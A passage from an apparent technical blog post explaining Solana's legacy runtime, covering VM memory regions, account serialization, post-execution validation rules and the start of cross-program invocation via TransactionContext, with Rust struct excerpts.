<pre><div class="rounded-sm" style="color:#ccc;background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto"><code class="language-rust" style="white-space:pre;color:#ccc;background:none;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999">1</span><span class="token token" style="color:#f08d49">0x100000000</span><span> </span><span class="token token" style="color:#67cdcc">-</span><span> </span><span class="token token" style="color:#f8c555">CODE</span><span>     </span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#f8c555">Program</span><span> executable bytecode
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999">2</span><span></span><span class="token token" style="color:#f08d49">0x200000000</span><span> </span><span class="token token" style="color:#67cdcc">-</span><span> </span><span class="token token" style="color:#f8c555">STACK</span><span>    </span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#f8c555">Call</span><span> </span><span class="token token" style="color:#f08d49">stack</span><span> </span><span class="token token" style="color:#ccc">(</span><span>4KB frames</span><span class="token token" style="color:#ccc">)</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999">3</span><span></span><span class="token token" style="color:#f08d49">0x300000000</span><span> </span><span class="token token" style="color:#67cdcc">-</span><span> </span><span class="token token" style="color:#f8c555">HEAP</span><span>     </span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#f8c555">Dynamic</span><span> </span><span class="token token" style="color:#f08d49">memory</span><span> </span><span class="token token" style="color:#ccc">(</span><span>32KB region</span><span class="token token" style="color:#ccc">)</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999">4</span><span></span><span class="token token" style="color:#f08d49">0x400000000</span><span> </span><span class="token token" style="color:#67cdcc">-</span><span> </span><span class="token token" style="color:#f8c555">INPUT</span><span>    </span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#f8c555">Program</span><span> input parameters </span><span class="token token" style="color:#67cdcc">&amp;</span><span> serialized account data</span></code></div></pre>
<p class="text-xl py-3 text-pretty sm:text-justify">Within the VM, during execution, programs can modify their own memory however they want without affecting the memory stored on the host. All validation is checked after the program execution completes.</p>
<h2 class="text-4xl py-4 border-b border-white/10">The Legacy Model: Single Program Execution (~v1.14.x)</h2>
<p class="text-xl py-3 text-pretty sm:text-justify">Let&#x27;s first understand how a simple program execution flows in the legacy model. This process involves four main phases: loading accounts from the database, executing bytecode in the rBPF VM, validating changes to guarantee integrity, and committing the results to storage.</p>
<p class="text-xl py-3 text-pretty sm:text-justify"><img src="/blog/2025_06_27/single_program_memory_layout.png" alt="Single Program Memory Layout"/></p>
<p class="text-xl py-3 text-pretty sm:text-justify">As shown in the diagram above, the legacy model serializes all account data into a contiguous <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">INPUT</code> region. Here&#x27;s how this process works:</p>
<h3 class="text-3xl py-4 border-b border-white/10">Phase 1: Loading and Serializing Accounts</h3>
<p class="text-xl py-3 text-pretty sm:text-justify">The host and VM operate in completely isolated environments, they can&#x27;t share objects or pointers directly. All account data must cross this boundary through serialization and deserialization, creating a controlled interface between the trusted host and the sandboxed VM.</p>
<p class="text-xl py-3 text-pretty sm:text-justify">The validator loads all requested accounts from the database and serializes them into a binary blob that gets copied into the <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">INPUT</code> region at <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">0x400000000</code>. Once inside the VM, programs usually start by deserializing the raw serialized <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">Accounts</code> into <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">AccountInfo</code> structures in its bootstrap routine<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align:0" xmlns="http://www.w3.org/2000/svg" width="0.988ex" height="1.887ex" role="img" focusable="false" viewBox="0 -833.9 436.6 833.9" xmlns:xlink="http://www.w3.org/1999/xlink"><defs><path id="MJX-1-TEX-N-31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></defs><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mi"></g><g data-mml-node="mn" transform="translate(33,363) scale(0.707)"><use data-c="31" xlink:href="#MJX-1-TEX-N-31"></use></g></g></g></g></svg></mjx-container>. The <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">AccountInfo</code> are stored in the VM&#x27;s heap memory before handing control to the program entrypoint function:</p>
<pre><div class="rounded-sm" style="color:#ccc;background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto"><code class="language-rust" style="white-space:pre;color:#ccc;background:none;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">1</span><span class="token token" style="color:#999">// How programs reconstruct AccountInfo from the serialized data</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">2</span><span></span><span class="token token" style="color:#cc99cd">pub</span><span> </span><span class="token token" style="color:#cc99cd">struct</span><span> </span><span class="token token type-definition" style="color:#f8c555">AccountInfo</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token lifetime-annotation" style="color:#f8c555">&#x27;a</span><span class="token token" style="color:#67cdcc">&gt;</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">3</span><span>    </span><span class="token token" style="color:#cc99cd">pub</span><span> key</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token lifetime-annotation" style="color:#f8c555">&#x27;a</span><span> </span><span class="token token" style="color:#f8c555">Pubkey</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">4</span><span>    </span><span class="token token" style="color:#cc99cd">pub</span><span> lamports</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#f8c555">Rc</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#f8c555">RefCell</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token lifetime-annotation" style="color:#f8c555">&#x27;a</span><span> </span><span class="token token" style="color:#cc99cd">mut</span><span> </span><span class="token token" style="color:#cc99cd">u64</span><span class="token token" style="color:#67cdcc">&gt;&gt;</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">5</span><span>    </span><span class="token token" style="color:#cc99cd">pub</span><span> data</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#f8c555">Rc</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#f8c555">RefCell</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token lifetime-annotation" style="color:#f8c555">&#x27;a</span><span> </span><span class="token token" style="color:#cc99cd">mut</span><span> </span><span class="token token" style="color:#ccc">[</span><span class="token token" style="color:#cc99cd">u8</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#67cdcc">&gt;&gt;</span><span class="token token" style="color:#ccc">,</span><span>  </span><span class="token token" style="color:#999">// Points directly into INPUT region!</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">6</span><span>    </span><span class="token token" style="color:#cc99cd">pub</span><span> owner</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token lifetime-annotation" style="color:#f8c555">&#x27;a</span><span> </span><span class="token token" style="color:#f8c555">Pubkey</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">7</span><span>    </span><span class="token token" style="color:#cc99cd">pub</span><span> rent_epoch</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#f8c555">Epoch</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">8</span><span>    </span><span class="token token" style="color:#cc99cd">pub</span><span> is_signer</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#cc99cd">bool</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">9</span><span>    </span><span class="token token" style="color:#cc99cd">pub</span><span> is_writable</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#cc99cd">bool</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">10</span><span>    </span><span class="token token" style="color:#cc99cd">pub</span><span> executable</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#cc99cd">bool</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">11</span><span></span><span class="token token" style="color:#ccc">}</span></code></div></pre>
<p class="text-xl py-3 text-pretty sm:text-justify"><code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">AccountInfo.data</code> points directly into the serialized representation within the <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">INPUT</code> region. For instance, if a program writes <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">account.data.borrow_mut()[0] = 42</code>, it&#x27;s modifying the serialized data in VM memory.</p>
<p class="text-xl py-3 text-pretty sm:text-justify"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align:0" xmlns="http://www.w3.org/2000/svg" width="0.988ex" height="1.887ex" role="img" focusable="false" viewBox="0 -833.9 436.6 833.9" xmlns:xlink="http://www.w3.org/1999/xlink"><defs><path id="MJX-2-TEX-N-31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></defs><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mi"></g><g data-mml-node="mn" transform="translate(33,363) scale(0.707)"><use data-c="31" xlink:href="#MJX-2-TEX-N-31"></use></g></g></g></g></svg></mjx-container> Programs can interact directly with the serialized bytes. Parsing serialized accounts into <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">AccountInfo</code> is just what the solana program sdk does to make life easier for developers.</p>
<h3 class="text-3xl py-4 border-b border-white/10">Phase 2: Program Execution</h3>
<p class="text-xl py-3 text-pretty sm:text-justify">Once the accounts are serialized and loaded into the <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">INPUT</code> region, the rBPF VM executes the program bytecode. The program has absolute control over its virtual memory space. It can overwrite account balances, change ownership, modify data, even corrupt the entire memory space. This design choice allows for maximum performance during execution, with security enforcement deferred to the validation phase.</p>
<h3 class="text-3xl py-4 border-b border-white/10">Phase 3: Post-Execution Validation</h3>
<p class="text-xl py-3 text-pretty sm:text-justify">After the program finishes execution, the validator validates every change made during execution. It doesn&#x27;t trust anything that happened during execution. Instead, it carefully checks every modification to ensure no rules were broken and no money was stolen.</p>
<p class="text-xl py-3 text-pretty sm:text-justify">Validation rules ensure state consistency and permission enforcement before persisting account state updates to storage:</p>
<ul class="text-xl py-2 text-pretty sm:text-justify" style="display:block;list-style-type:disc;padding-inline-start:40px">
<li>Account fields modifiable only if the account is marked writable in the <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">Transaction</code> and <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">Instruction</code>.</li>
<li>Only the account owner modifies <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">owner</code> and <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">data</code>.</li>
<li><code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">Owner</code> modifiable only when data is zeroed.</li>
<li>Lamports can be increased by anyone but decreased only by the owner.</li>
<li>Total lamports remains consistent across transaction execution.</li>
</ul>
<h3 class="text-3xl py-4 border-b border-white/10">Phase 4: Final Commit</h3>
<p class="text-xl py-3 text-pretty sm:text-justify">After all validation rules pass, the modified account states are committed back to the database. All changes made during program execution are now persisted and the transaction is confirmed. If any validation rule fails, the entire transaction is rejected and no changes are stored.</p>
<p class="text-xl py-3 text-pretty sm:text-justify">Sounds simple, right?</p>
<h2 class="text-4xl py-4 border-b border-white/10">When Programs Need to Talk: Cross-Program Invocation (v1.14.x)</h2>
<p class="text-xl py-3 text-pretty sm:text-justify">But what happens when programs need to invoke each other, for instance, when your dex program needs to call the token program to transfer tokens? This is where Cross-Program Invocation (CPI) comes in, and where the elegant simplicity of single program execution starts to break down.</p>
<p class="text-xl py-3 text-pretty sm:text-justify">The challenge is that each program runs in its own isolated VM with its own memory space. When Program A calls Program B, they can&#x27;t simply share pointers or objects. Account data must be carefully marshaled between these isolated environments while maintaining security and consistency.</p>
<h3 class="text-3xl py-4 border-b border-white/10">TransactionContext: Shared Account Cache</h3>
<p class="text-xl py-3 text-pretty sm:text-justify">This brings us to a detail we omitted up till now. Since <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">Transaction</code> are atomic and may include multiple <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">Instruction</code>, it must have a way to cache temporal execution results of earlier <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">Instructions</code> before latter <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">Instructions</code> finish. This cache is crucial since we can&#x27;t allow executions effects of earlier <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">Instructions</code> to persist if unfortunately latter <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">Instructions</code> revert.</p>
<p class="text-xl py-3 text-pretty sm:text-justify">To this end, Solana introduces the <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">TransactionContext</code> structure state caching. The <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">TransactionContext</code> contains <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">AccountSharedData</code> structures, which are used to hold changes to accounts before the runtime either commits the changes to permanent storage, or reverts them later.</p>
<pre><div class="rounded-sm" style="color:#ccc;background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto"><code class="language-rust" style="white-space:pre;color:#ccc;background:none;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">1</span><span class="token token" style="color:#cc99cd">pub</span><span> </span><span class="token token" style="color:#cc99cd">struct</span><span> </span><span class="token token type-definition" style="color:#f8c555">TransactionContext</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">2</span><span>    account_keys</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#f8c555">Pin</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#f8c555">Box</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#ccc">[</span><span class="token token" style="color:#f8c555">Pubkey</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#67cdcc">&gt;&gt;</span><span class="token token" style="color:#ccc">,</span><span>              </span><span class="token token" style="color:#999">// All account addresses in transaction</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">3</span><span>    accounts</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#f8c555">Arc</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#f8c555">TransactionAccounts</span><span class="token token" style="color:#67cdcc">&gt;</span><span class="token token" style="color:#ccc">,</span><span>            </span><span class="token token" style="color:#999">// Shared account data cache</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">4</span><span>    instruction_stack</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#f8c555">Vec</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#f8c555">InstructionContext</span><span class="token token" style="color:#67cdcc">&gt;</span><span class="token token" style="color:#ccc">,</span><span>    </span><span class="token token" style="color:#999">// CPI call stack</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">5</span><span>    </span><span class="token token" style="color:#ccc">...</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">6</span><span></span><span class="token token" style="color:#ccc">}</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">7</span>
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">8</span><span></span><span class="token token" style="color:#cc99cd">pub</span><span> </span><span class="token token" style="color:#cc99cd">struct</span><span> </span><span class="token token type-definition" style="color:#f8c555">TransactionAccounts</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">9</span><span>    accounts</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#f8c555">Vec</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#f8c555">RefCell</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#f8c555">AccountSharedData</span><span class="token token" style="color:#67cdcc">&gt;&gt;</span><span class="token token" style="color:#ccc">,</span><span>     </span><span class="token token" style="color:#999">// Mutable account data</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">10</span><span>    </span><span class="token token" style="color:#ccc">...</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">11</span><span></span><span class="token token" style="color:#ccc">}</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">12</span>
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">13</span><span></span><span class="token token" style="color:#999">// Shared account data that persists across CPI boundaries </span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">14</span><span></span><span class="token token" style="color:#cc99cd">pub</span><span> </span><span class="token token" style="color:#cc99cd">struct</span><span> </span><span class="token token type-definition" style="color:#f8c555">AccountSharedData</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">15</span><span>    lamports</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#cc99cd">u64</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">16</span><span>    data</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#f8c555">Arc</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#f8c555">Vec</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#cc99cd">u8</span><span class="token token" style="color:#67cdcc">&gt;&gt;</span><span class="token token" style="color:#ccc">,</span><span>                           </span><span class="token token" style="color:#999">// Thread-safe shared data buffer</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">17</span><span>    owner</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#f8c555">Pubkey</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">18</span><span>    </span><span class="token token" style="color:#ccc">...</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">19</span><span></span><span class="token token" style="color:#ccc">}</span></code></div></pre>
<p class="text-xl py-3 text-pretty sm:text-justify">Handling CPI is somewhat similar to handling multiple <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">Instructions</code>, so the same <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">TransactionContext</code> can be repurposed to pass information between programs.</p>
<p class="text-xl py-3 text-pretty sm:text-justify">On CPI calls / returns, we need to expose the latest account states from the invoking side to the receiving side of the CPI. Solana runtime does this by first validating the latest changes to the account and committing them into the <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">TransactionContext</code>, then passing the accounts in the <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">TransactionContext</code> into the other VM.</p>
<h3 class="text-3xl py-4 border-b border-white/10">CPI Call Process</h3>
<p class="text-xl py-3 text-pretty sm:text-justify"><img src="/blog/2025_06_27/cpi_call.png" alt="CPI Call"/></p>
<p class="text-xl py-3 text-pretty sm:text-justify">The <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">TransactionContext</code> we described earlier lives on the host and serves as the bridge between two isolated VMs. When Program A calls Program B, each program runs in its own separate VM with isolated memory spaces, but they share account state through the host-side <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">TransactionContext</code>. Here&#x27;s what happens:</p>
<h4 class="text-2xl py-4 border-b border-white/10">Step 1: Instruction Crafting</h4>
